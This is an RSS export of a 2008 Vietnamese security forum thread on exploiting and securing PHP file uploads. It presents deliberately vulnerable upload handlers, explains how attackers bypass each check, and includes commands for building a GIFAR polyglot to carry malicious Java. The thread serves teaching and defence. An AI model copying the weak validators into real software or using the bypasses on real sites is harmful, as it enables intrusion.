@@ -1,0 +1,835 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Khai thác và phòng chống file upload trong PHP Web Applications"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Khai thác và phòng chống file upload trong PHP Web Applications"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ <font color='orange'><b>I. GIỚI THIỆU</b></font>
+Ứng dụng Web hỗ trợ cho phép người sử dụng thực hiện upload file lên server hiện tại có rất nhiều. Ví dụ như upload image(*.gif, *.jpg), *.pdf, *.doc, ...
+Trong bài này seamoun sẽ trình bày một số lỗi khi lập trình file upload mà kẻ xấu có thể lợi dụng để upload những mã độc lên server. Những phương thức khai thác mà seamoun trình bày chỉ mang tính tham khảo không ủng hộ các bạn khai thác đối với những server bị mắc lỗi.
+ 
+<font color='orange'><b>II. KHAI THÁC LỖI UPLOAD FILE</b></font>
+1) Trường hợp sử dụng JavaScript để kiểm tra file upload
+Giả sử ta có kịch bản gồm 2 file như sau:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;html&gt;
+&lt;title&gt;Secure file upload PHP Web Applications&lt;/title&gt;
+&lt;head&gt;
+&lt;script language=javascript&gt;
+function chkFileExtension&#40;&#41;
+{
+	var str=document.upload.userfile.value;
+	var ext=str.substring&#40;str.length,str.length-3&#41;;
+	if &#40; ext != "gif"&#41;
+	{
+		alert&#40;"File is invalid"&#41;;
+		return false;
+	}
+	else
+	{
+		return true;
+	};
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form name="upload" action="upload1.php" method="POST" ENCTYPE="multipart/form-data"  onSubmit="return chkFileExtension&#40;&#41;"&gt;
+Select the file to upload: &lt;input type="file" name="userfile"&gt;
+&lt;input type="submit" name="upload" value="upload"&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+		</div>
+
+
+
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+
+$uploaddir = 'uploads/';
+$uploadfile = $uploaddir . basename&#40;$_FILES&#91;'userfile'&#93;&#91;'name'&#93;&#41;;
+
+if &#40;move_uploaded_file&#40;$_FILES&#91;'userfile'&#93;&#91;'tmp_name'&#93;, $uploadfile&#41;&#41; {
+    echo "File was successfully uploaded.\n";
+} else {
+    echo "File uploading failed.\n";
+}
+?&gt;</pre>
+		</div>
+
+Ví dụ trên cho thấy người lập trình kiểm tra phần mở rộng file cho phép file upload bằng cách sử dụng một đoạn mã Javascript trong file upload1.html. Chỉ chấp nhận những file có phần mở rộng là *.gif thì mới được phép upload, cách này một kẻ tấn công dễ dàng vượt qua bằng cách sử dụng một intercepting proxy hoặc có thể viết một đoạn mã bằng Perl, Python,... mà đệ trình trực tiếp đến file upload1.php với những tham số cần thiết.
+
+Trong demo sau seamoun sử dụng Burp Suite là một tool rất mạnh khi thực hiện Web Application. Có thể download tại :<span class="link"> http://portswigger.net/</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153174</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153174</link>
+				<pubDate><![CDATA[Sat, 27 Sep 2008 17:31:46]]> GMT</pubDate>
+				<author><![CDATA[ seamoun]]></author>
+			</item>
+			<item>
+				<title>Khai thác và phòng chống file upload trong PHP Web Applications - 2</title>
+				<description><![CDATA[ 2) Trường hợp không sử dụng JavaScript để kiểm tra mà thực hiện kiểm tra trên server với đoạn mã sau:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+
+if&#40;$_FILES&#91;'userfile'&#93;&#91;'type'&#93; != "image/gif"&#41; {
+    echo "Sorry, we only allow uploading GIF images";
+    exit;
+}
+
+$uploaddir = 'uploads/';
+$uploadfile = $uploaddir . basename&#40;$_FILES&#91;'userfile'&#93;&#91;'name'&#93;&#41;;
+
+if &#40;move_uploaded_file&#40;$_FILES&#91;'userfile'&#93;&#91;'tmp_name'&#93;, $uploadfile&#41;&#41; {
+    echo "File is valid, and was successfully uploaded.\n";
+} else {
+    echo "File uploading failed.\n";
+}
+
+?&gt;</pre>
+		</div>
+Với đoạn mã trên người lập trình hy vọng ngăn chặn được kẻ tấn công upload file độc hại lên server bằng cách sử dụng kiểm tra type=image/gif. Tức là kiểu file cho phép upload ở đây chỉ có thể là file gif. Điều này cũng không an toàn bởi vì kẻ tấn công có thể thay đổi kiểu type=image/gif cho phù hợp với sự kiểm tra của đoạn mã trên nhưng nội dung vẫn chứa mã độc.
+Sau đây là demo thứ 2 khai thác lỗi file upload trong PHP WebApp]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153175</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153175</link>
+				<pubDate><![CDATA[Sat, 27 Sep 2008 17:34:30]]> GMT</pubDate>
+				<author><![CDATA[ seamoun]]></author>
+			</item>
+			<item>
+				<title>Khai thác và phòng chống file upload trong PHP Web Applications - 3</title>
+				<description><![CDATA[ 3) Trường hợp kiểm tra mime - kiểm tra phần nội dung của file upload với đoạn mã sau:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+
+$imageinfo = getimagesize&#40;$_FILES&#91;'userfile'&#93;&#91;'tmp_name'&#93;&#41;;
+
+if&#40;$imageinfo&#91;'mime'&#93; != 'image/gif' && $imageinfo&#91;'mime'&#93; != 'image/jpeg'&#41; {
+    echo "Sorry, we only accept GIF and JPEG images\n";
+    exit;
+}
+
+$uploaddir = 'uploads/';
+$uploadfile = $uploaddir . basename&#40;$_FILES&#91;'userfile'&#93;&#91;'name'&#93;&#41;;
+
+if &#40;move_uploaded_file&#40;$_FILES&#91;'userfile'&#93;&#91;'tmp_name'&#93;, $uploadfile&#41;&#41; {
+    echo "File is valid, and was successfully uploaded.\n";
+} else {
+    echo "File uploading failed.\n";
+}
+
+?&gt;</pre>
+		</div>
+
+Như vậy liệu có cải thiện hơn ? An toàn hơn ? Trả lời: có cái thiện hơn nhưng vẫn chưa an toàn. Mặc dù với đoạn mã trên kẻ tấn công không thực hiện thành công như ở Lab2, khi thay đổi type=image/gif vì lúc này người lập trình đã kiểm tra nội dung file upload có đúng là gif hay không ?. Nhưng nếu kẻ tấn công sử dụng một file gif và chèn mã độc vào thì thế nào ? Khai thác sẽ thành công !!!!
+
+Sau đây là demo thứ 3 khai thác lỗi file upload trong PHP WebApp]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153177</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153177</link>
+				<pubDate><![CDATA[Sat, 27 Sep 2008 17:37:36]]> GMT</pubDate>
+				<author><![CDATA[ seamoun]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ 4) Trường hợp kiểm tra phần mở rộng của file trên server với đoạn mã sau:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+
+$blacklist = array&#40;".php", ".phtml"&#41;;
+
+foreach &#40;$blacklist as $item&#41; {
+   if&#40;preg_match&#40;"/$item\$/i", $_FILES&#91;'userfile'&#93;&#91;'name'&#93;&#41;&#41; {
+       echo "We do not allow uploading PHP files\n";
+       exit;
+   }
+}
+
+$uploaddir = 'uploads/';
+$uploadfile = $uploaddir . basename&#40;$_FILES&#91;'userfile'&#93;&#91;'name'&#93;&#41;;
+
+if &#40;move_uploaded_file&#40;$_FILES&#91;'userfile'&#93;&#91;'tmp_name'&#93;, $uploadfile&#41;&#41; {
+    echo "File is valid, and was successfully uploaded.\n";
+} else {
+    echo "File uploading failed.\n";
+}
+?&gt;</pre>
+		</div>
+
+Như vậy với đoạn mã người lập trình đã ngăn chặn kẻ tấn công không thể upload file *.php lên server. Tuy nhiên trường hợp này cũng chưa an toàn với những server mà có cấu hình file *.gif, *.jpg cho phép xử lý PHP. Do vậy kẻ tấn công vẫn upload file gif, jpg lên server nhưng có chèn thêm mã độc vào.
+<font color='orange'><b>
+III. CÁCH PHÒNG CHỐNG</b></font>
+Mấu chốt giải quyết vấn để làm thế nào an toàn trong file upload đó là lưu giữ file upload lên một nơi mà không thể truy cập bởi user thông qua URL. Điều này có thể thực hiện được bằng cách lưu file upload bên ngoài thưc mục webroot hoặc trên web server nhưng từ chối truy cập đến thư mục đó.
+
+Tài liệu tham khảo: Secure File Upload In PHP Web Applications - ScanIt
+Công cụ sử dụng: Burp Suite <span class="link"> http://portswigger.net/</span>)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153178</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153178</link>
+				<pubDate><![CDATA[Sat, 27 Sep 2008 17:40:41]]> GMT</pubDate>
+				<author><![CDATA[ seamoun]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Hay lém anh seamoun. Có một hướng khai thác liên quan đến tính năng upload file trong web-application (không riêng gì PHP) mới được công bố ở hội thảo BlackHat 2008 vừa rồi là GIFAR. Tóm tắt là kết hợp file GIF với file JAR lại để vượt qua same-origin policy của trình duyệt.
+
+Xem thêm http://heasman.blogspot.com/2008/08/on-gifars.html và http://www.gnucitizen.org/blog/more-on-gifars-and-other-dangerous-attacks/
+
+Bà con thử bình luận về cái GIFAR này xem.
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153189</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153189</link>
+				<pubDate><![CDATA[Sat, 27 Sep 2008 19:30:41]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ @seamoun : Hình như anh chưa upload các demo phải ko nhỉ  :D 
+
+Thân,]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153228</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153228</link>
+				<pubDate><![CDATA[Sun, 28 Sep 2008 02:09:39]]> GMT</pubDate>
+				<author><![CDATA[ rickb]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">rickb wrote:</cite><br>
+		<blockquote>@seamoun : Hình như anh chưa upload các demo phải ko nhỉ  :D 
+
+Thân,&nbsp;
+		</blockquote>
+
+Các demo cho từng phần seamoun đã attach rồi mà. Login vào thấy file OK mà.
+
+<p></p>
+		<cite class="blockquote">mrro wrote:</cite><br>
+		<blockquote>Hay lém anh seamoun. Có một hướng khai thác liên quan đến tính năng upload file trong web-application (không riêng gì PHP) mới được công bố ở hội thảo BlackHat 2008 vừa rồi là GIFAR. Tóm tắt là kết hợp file GIF với file JAR lại để vượt qua same-origin policy của trình duyệt.
+
+Xem thêm<span class="link"> http://heasman.blogspot.com/2008/08/on-gifars.html</span> và<span class="link"> http://www.gnucitizen.org/blog/more-on-gifars-and-other-dangerous-attacks/</span>
+
+Bà con thử bình luận về cái GIFAR này xem.&nbsp;
+		</blockquote>
+
+Anh cũng đang đọc bài viết trong link em gửi. Thanks
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153245</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153245</link>
+				<pubDate><![CDATA[Sun, 28 Sep 2008 10:40:22]]> GMT</pubDate>
+				<author><![CDATA[ seamoun]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Cho em hõi xí về GIFAR này : 
+
+Khi đã tích hợp 2 file thành công, thì khi duyệt file GIFAR.gif thì applet java có được thực thi ko ? hay phải nhờ đến tag html &lt;applet code="xxx.class" archive="GIFAR.gif"&gt; ?
+
+Và lỗi này chỉ thực thi được ở phía client ( và client phải có cài đặt java ) chứ ko tác động được đến webserver ?
+
+Đây là sự kết hợp hoàn hảo với lỗi XSS ?
+
+Thx trước ạh  :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153559</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153559</link>
+				<pubDate><![CDATA[Wed, 1 Oct 2008 14:55:56]]> GMT</pubDate>
+				<author><![CDATA[ flier_vn]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">flier_vn wrote:</cite><br>
+		<blockquote>Cho em hõi xí về GIFAR này : 
+
+Khi đã tích hợp 2 file thành công, thì khi duyệt file GIFAR.gif thì applet java có được thực thi ko ? hay phải nhờ đến tag html &lt;applet code="xxx.class" archive="GIFAR.gif"&gt; ?
+
+Và lỗi này chỉ thực thi được ở phía client ( và client phải có cài đặt java ) chứ ko tác động được đến webserver ?
+
+Đây là sự kết hợp hoàn hảo với lỗi XSS ?
+
+Thx trước ạh  :D&nbsp;
+		</blockquote>
+Theo tôi biết thì bạn phải dùng đến cái &lt;applet ...="GIFAR.gif"&gt;.
+Mới nhìn thì nó sẽ chạy code ở client, và có vẻ như không tác động đến server, nhưng sự nguy hại của nó là ở chỗ sau:
+
+file GIFAR.gif này được upload lên đâu đó, ví dụ HVA ;-)
+
+HTML file: &lt;applet ...="http://hva/upload/GIFAR.gif"&gt;
+HTML file này có thể nằm ở 1 chỗ khác và nó có thể load & execute file GIFAR.gif <b>được load từ HVA</b>.
+Tuy được load từ HVA về máy của user và chạy ở client, nhưng file GIFAR.gif này có thể tương tác được với server của HVA (vì codebase là nó được load từ trên HVA về) và lấy được cookie của forum HVA của user.
+
+Nhưng lấy cookie được chưa chắc đã nguy hại vì:
+- user đó có thể không là member của HVA, chưa từng vào HVA --&gt; cookie nà empty
+- cơ chế bảo mật của forum HVA làm cho việc lấy được cookie cũng không khai thác được gì nhiều.
+
+Ở đây vấn đề nguy hại hơn là đoạn mã java chứa trong file GIFAR.gif có thể tương tác được với server HVA trực tiếp qua đường socket. Điều này có thể được lợi dụng để mượn tay user đó DoS (lúc này sẽ là DDoS) HVA :-)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153563</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153563</link>
+				<pubDate><![CDATA[Wed, 1 Oct 2008 15:25:28]]> GMT</pubDate>
+				<author><![CDATA[ nbthanh]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ àh :d Vậy đã hiểu :D
+
+Nếu vậy thì chỉ cần upload file GIFAR.gif lên webserver victim rồi tự tạo 1 form trên máy mình rồi cho load... vậy có nghĩa là applet đã thực thi trên webserver ! Nhưng theo em biết thì nó lại ko tác động được đến HDD... vậy chỉ có thể dừng lại ở bước lấy các thông tin browser thôi àh ??
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153565</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153565</link>
+				<pubDate><![CDATA[Wed, 1 Oct 2008 15:35:57]]> GMT</pubDate>
+				<author><![CDATA[ flier_vn]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ @flier_vn: khổ bạn quá, gì mà từa lưa hết, chỗ này xọ chỗ kia. ngồi xem lại xem java applet là cái chi rồi hẵng coi cái GIFAR này là cái chi, kẻo bị tẩu hỏa nhập ma thì chẳng có ai cứu được đâu.
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153567</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153567</link>
+				<pubDate><![CDATA[Wed, 1 Oct 2008 15:44:59]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ Mình thì dùng cách cho phép upload lên 1 thư mục xyz nào đó (web server sẽ có quyền write trên xyz) nhưng thư mục đó không có quyền execute script.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153610</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153610</link>
+				<pubDate><![CDATA[Wed, 1 Oct 2008 22:11:14]]> GMT</pubDate>
+				<author><![CDATA[ giobuon]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">mrro wrote:</cite><br>
+		<blockquote>@flier_vn: khổ bạn quá, gì mà từa lưa hết, chỗ này xọ chỗ kia. ngồi xem lại xem java applet là cái chi rồi hẵng coi cái GIFAR này là cái chi, kẻo bị tẩu hỏa nhập ma thì chẳng có ai cứu được đâu.
+
+--m&nbsp;
+		</blockquote>
+
+Ừhm ! Em xin lỗi, em sẽ rút kinh nghiệm, lần sau khi tham gia chủ đề nào đó thì em phải chắc chắn rằng em am hiểu 1 chút kiến thức về chủ đề đó thì mới dám mở miệng tham gia :D Thx anh rất nhiều.. !
+
+àh ! Riêng về cái này thì thx anh nbthanh đã giúp em hiểu phần nào rồi :) 
+
+Còn đây em xin post cách tạo file GIFAR.gif ( cũng như tương tự ) dành cho những bạn chưa biết : 
+<blockquote>
+1. Xoạn thảo 1 file java chứa mã độc rồi complie lại : 
+$ : javac exp1.java
+
+rồi : 
+$: jar -cf exp1.jar exp1.class =&gt; tạo file .JAR
+
+Tiếp :
+
+$ : cat xxx.gif exp1.jar &gt; gifar.gif &nbsp;
+		</blockquote>
+
+Okies! Thành công :D
+
+
+To mrror : Nhưng.... cái lối nói chuyện của anh thì hok bik sau này anh dạy con, dạy cháu anh sao nữa, thậm chí bây giờ nếu đoán ko lầm chắc bạn bè anh chỉ đếm đầu ngón tay ! hahaha ! Muốn chỉ bảo ai thì cũng phải làm cho người đó phục trước đã ! Từng lời lẽ phát ra phải làm cho người ta "mến" và phục, như reply như anh nbt_thanh thì làm gì có ai dám mở miệng nào tiếng nào ! hahaha ! Hok biết mỗi lần bro phát ngôn ra là lại có người chỉ chữi, mặc dù cũng có rất nhiều anh cũng hay châm chọt, nhưng châm chọt của họ là để giúp cho mình tiến bộ nên mọi người cũng rất hài lòng ! Bro mới là người coi chứng bị tẫu quả nhập ma, riết hok có ai chơi với mình thì bị tẫu quả thiệt đó ! haha !
+
+to all : có gì sai thì move wa box tán gẫu, vì ko có lý do gì để cho vào thùng rác :)
+
+
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153642</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153642</link>
+				<pubDate><![CDATA[Thu, 2 Oct 2008 02:53:00]]> GMT</pubDate>
+				<author><![CDATA[ flier_vn]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">flier_vn wrote:</cite><br>
+		<blockquote>...
+
+To mrror : Nhưng.... cái lối nói chuyện của anh thì hok bik sau này anh dạy con, dạy cháu anh sao nữa, thậm chí bây giờ nếu đoán ko lầm chắc bạn bè anh chỉ đếm đầu ngón tay ! hahaha ! Muốn chỉ bảo ai thì cũng phải làm cho người đó phục trước đã ! Từng lời lẽ phát ra phải làm cho người ta "mến" và phục, như reply như anh nbt_thanh thì làm gì có ai dám mở miệng nào tiếng nào ! hahaha ! Hok biết mỗi lần bro phát ngôn ra là lại có người chỉ chữi, mặc dù cũng có rất nhiều anh cũng hay châm chọt, nhưng châm chọt của họ là để giúp cho mình tiến bộ nên mọi người cũng rất hài lòng ! Bro mới là người coi chứng bị tẫu quả nhập ma, riết hok có ai chơi với mình thì bị tẫu quả thiệt đó ! haha !
+
+to all : có gì sai thì move wa box tán gẫu, vì ko có lý do gì để cho vào thùng rác :)
+
+&nbsp;
+		</blockquote>
+
+Tôi thấy mrro góp ý bồ không có gì là quá đáng cả (tôi tuyệt đối không bênh mrro ở đây). Bởi thế, bồ không nên bức xúc như thế.
+
+Nếu bồ thấy mrro góp ý thiếu chính xác chỗ nào, bồ phản biện ngay chỗ ấy. Đừng mang chuyện phỏng đoán và đặc biệt đừng lôi chuyện đời tư cá nhân (dù có thật hay suy diễn) ra để phản biện. Đây là một thói quen không tốt và không nên duy trì. 
+
+Hành động phản biện có giá trị hay không còn phụ thuộc vào khả năng diễn đạt và ngôn từ của mình. Một đoạn phản biện ngắn ngủi mang tính phỏng đoán và bêu rếu chuyện cá nhân đã tệ mà chính tả, câu cú, từ vựng be bét thì cũng tệ không kém.
+
+Bài trả lời trên của bồ đáng vào thùng rác và moderators có trọn quyền quyết định xử lý nó như thế nào chớ không phải bồ. Tôi để yên bài phản biện của bồ như trên và cảnh cáo bồ lần thứ nhất. Mong bồ tỉnh táo và tiếp tục thảo luận chuyện kỹ thuật (chớ không phải chuyện cá nhân theo kiểu phỏng đoán).]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153648</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153648</link>
+				<pubDate><![CDATA[Thu, 2 Oct 2008 07:15:56]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">flier_vn wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">mrro wrote:</cite><br>
+		<blockquote>@flier_vn: khổ bạn quá, gì mà từa lưa hết, chỗ này xọ chỗ kia. ngồi xem lại xem java applet là cái chi rồi hẵng coi cái GIFAR này là cái chi, kẻo bị tẩu hỏa nhập ma thì chẳng có ai cứu được đâu.
+
+--m&nbsp;
+		</blockquote>
+
+Ừhm ! Em xin lỗi, em sẽ rút kinh nghiệm, lần sau khi tham gia chủ đề nào đó thì em phải chắc chắn rằng em am hiểu 1 chút kiến thức về chủ đề đó thì mới dám mở miệng tham gia :D Thx anh rất nhiều.. !
+
+àh ! Riêng về cái này thì thx anh nbthanh đã giúp em hiểu phần nào rồi :) 
+
+Còn đây em xin post cách tạo file GIFAR.gif ( cũng như tương tự ) dành cho những bạn chưa biết : 
+<blockquote>
+1. Xoạn thảo 1 file java chứa mã độc rồi complie lại : 
+$ : javac exp1.java
+
+rồi : 
+$: jar -cf exp1.jar exp1.class =&gt; tạo file .JAR
+
+Tiếp :
+
+$ : cat xxx.gif exp1.jar &gt; gifar.gif &nbsp;
+		</blockquote>
+
+Okies! Thành công :D
+
+
+To mrror : Nhưng.... cái lối nói chuyện của anh thì hok bik sau này anh dạy con, dạy cháu anh sao nữa, thậm chí bây giờ nếu đoán ko lầm chắc bạn bè anh chỉ đếm đầu ngón tay ! hahaha ! Muốn chỉ bảo ai thì cũng phải làm cho người đó phục trước đã ! Từng lời lẽ phát ra phải làm cho người ta "mến" và phục, như reply như anh nbt_thanh thì làm gì có ai dám mở miệng nào tiếng nào ! hahaha ! Hok biết mỗi lần bro phát ngôn ra là lại có người chỉ chữi, mặc dù cũng có rất nhiều anh cũng hay châm chọt, nhưng châm chọt của họ là để giúp cho mình tiến bộ nên mọi người cũng rất hài lòng ! Bro mới là người coi chứng bị tẫu quả nhập ma, riết hok có ai chơi với mình thì bị tẫu quả thiệt đó ! haha !
+
+to all : có gì sai thì move wa box tán gẫu, vì ko có lý do gì để cho vào thùng rác :)
+
+
+
+&nbsp;
+		</blockquote>
+
+Đọc tạm cái này đi. Sẽ giúp ích phần nào đấy  ;) 
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://forum.vnoss.org/pub/smart-questions-vi.html#Hi%E1%BB%83u_c%C3%A2u_tr%E1%BA%A3_l%E1%BB%9Di_nh%C6%B0_th%E1%BA%BF_n%C3%A0o</pre>
+		</div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153667</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153667</link>
+				<pubDate><![CDATA[Thu, 2 Oct 2008 11:20:18]]> GMT</pubDate>
+				<author><![CDATA[ giobuon]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ cho em hỏi là tại sao mình không chỉnh lại đoạn javascript rồi upload lên hoạt là tắt chức năng sử dụng javascript đi vì cách này em hay dùng thay vì phải dùng tool chỉnh gói tin gửi đi! tuy nhiên cám ơn anh nhiều vì cho em cái tool khá hay hehe!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153677</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153677</link>
+				<pubDate><![CDATA[Thu, 2 Oct 2008 12:05:07]]> GMT</pubDate>
+				<author><![CDATA[ hackerbinhphuoc]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">hackerbinhphuoc wrote:</cite><br>
+		<blockquote>cho em hỏi là tại sao mình không chỉnh lại đoạn javascript rồi upload lên hoạt là tắt chức năng sử dụng javascript đi vì cách này em hay dùng thay vì phải dùng tool chỉnh gói tin gửi đi! tuy nhiên cám ơn anh nhiều vì cho em cái tool khá hay hehe!&nbsp;
+		</blockquote>
+javascript thì sao mà can thiệp vào content-type:  trong HTTP Header đc ? trường hợp phía server-side nó check content-type thì phải dùng proxy để sửa lại content-type để spoof nó. Chứ dùng java-script mà check phía client thì nói làm gì nữa  :D ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153681</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153681</link>
+				<pubDate><![CDATA[Thu, 2 Oct 2008 12:21:19]]> GMT</pubDate>
+				<author><![CDATA[ gamma95]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ hehe em nói ở ví dụ 1 mà anh, rõ ràng nó check ở client  mà!, còn các ví dụ khác thi buộc phải  chỉnh gói tin gửi đi rồi! nhiều site như vậy lém, check ở client!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153692</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153692</link>
+				<pubDate><![CDATA[Thu, 2 Oct 2008 12:47:30]]> GMT</pubDate>
+				<author><![CDATA[ hackerbinhphuoc]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">hackerbinhphuoc wrote:</cite><br>
+		<blockquote>hehe em nói ở ví dụ 1 mà anh, rõ ràng nó check ở client  mà!, còn các ví dụ khác thi buộc phải  chỉnh gói tin gửi đi rồi! nhiều site như vậy lém, check ở client!&nbsp;
+		</blockquote>
+Ah, vậy em chỉnh đoạn javascript bằng cách nào  :D ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153698</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153698</link>
+				<pubDate><![CDATA[Thu, 2 Oct 2008 13:19:24]]> GMT</pubDate>
+				<author><![CDATA[ gamma95]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ tắt chức năng sử dụng javascript đi hoặc là lưu file đó lại, đổi chữ "gif" bằng "php" được không nhỉ ?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153707</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25298.hva#153707</link>
+				<pubDate><![CDATA[Thu, 2 Oct 2008 13:37:09]]> GMT</pubDate>
+				<author><![CDATA[ hackerbinhphuoc]]></author>
+			</item>
+			<item>
+				<title>Re: Khai thác và phòng chống file upload trong PHP Web Applications</title>
+				<description><![CDATA[ <blockquote>&lt;html&gt;
+ &lt;title&gt;Secure file upload PHP Web Applications&lt;/title&gt;
+ &lt;head&gt;
+ &lt;script language=javascript&gt;
+ function chkFileExtension()
+ {
+ 	var str=document.upload.userfile.value;
+ 	var ext=str.substring(str.length,str.length-3);
+ 	if ( ext != "gif")
+ 	{
+ 		alert("File is invalid");
+ 		return false;
+ 	}
+ 	else
+ 	{
+ 		return true;
+ 	};
+ }
+ &lt;/script&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+ &lt;form name="upload" action="upload1.php" method="POST" ENCTYPE="multipart/form-data"  onSubmit="return chkFileExtension()"&gt;
+ Select the file to upload: &lt;input type="file" name="userfile"&gt;
+ &lt;input type="submit" name="upload" value="upload"&gt;
+ &lt;/form&gt;
+ &lt;/body&gt;
